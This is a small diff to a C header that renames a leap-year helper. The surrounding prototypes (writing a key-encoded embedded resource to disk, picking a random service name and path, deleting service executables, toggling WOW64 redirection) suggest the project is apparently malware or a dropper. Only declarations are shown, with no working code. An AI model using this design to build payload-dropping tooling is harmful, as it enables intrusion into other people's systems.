@@ -36,7 +36,7 @@ void DeleteServiceExecutables();
 int _Wow64DisableWow64FsRedirection(PVOID *OldValue);
 int _Wow64RevertWow64FsRedirection(PVOID OlValue);
 bool Is32Bit();
-BOOL IsBissextileYear(signed int year);
+bool IsLeapYear(signed int year);
 int GetDaysInMonth(signed int year, int month);
 bool WriteEncodedResource(LPCWSTR lpFileName, HMODULE hModule, LPCWSTR lpName, LPCWSTR lpType, char *key, unsigned int key_len);
 bool GetRandomServiceInfo(WCHAR *svc_name, WCHAR *svc_path);
